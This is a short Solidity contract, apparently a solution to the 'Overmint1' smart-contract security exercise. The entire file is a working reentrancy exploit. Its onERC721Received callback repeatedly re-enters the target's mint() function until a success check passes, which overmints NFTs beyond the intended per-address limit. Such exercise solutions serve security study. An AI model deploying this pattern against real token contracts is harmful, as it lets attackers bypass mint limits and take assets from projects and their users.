// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "./Overmint1.sol";

/*
 * @title Overmint1Hack
 * @dev A smart contract designed to exploit the Overmint1 contract by overminting tokens.
 * This contract implements the IERC721Receiver interface to receive ERC721 tokens.
 */
contract Overmint1Hack is IERC721Receiver {
    Overmint1 erc721Token;

    /*
     * @dev Constructs a new Overmint1Hack contract instance.
     * @param _erc721Token The address of the Overmint1 contract.
     */
    constructor(Overmint1 _erc721Token) {
        erc721Token = _erc721Token;
    }

    /*
     * @dev Handles the receipt of an ERC721 token.
     * The ERC721 smart contract calls this function on the recipient
     *  after a `safeTransfer`. This function checks if the sender is the Overmint1 contract
     *  and calls the `success` function. If not successful, it calls the `mint` function.
     * @param _from The sender of the token.
     * @param _tokenId The NFT identifier which is being transferred.
     * @param _data Additional data with no specified format.
     * @return `bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"))` unless throwing
     */
    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external override returns (bytes4) {
        if (msg.sender != address(erc721Token)) {
            return this.onERC721Received.selector;
        }

        bool success = erc721Token.success(address(this));
        if (!success) {
            erc721Token.mint();
        }

        return this.onERC721Received.selector;
    }

    /*
    * @dev Initiates the hack by calling the `mint` function on the Overmint1 contract.
    */
    function hack() external {
        erc721Token.mint();
    }
}
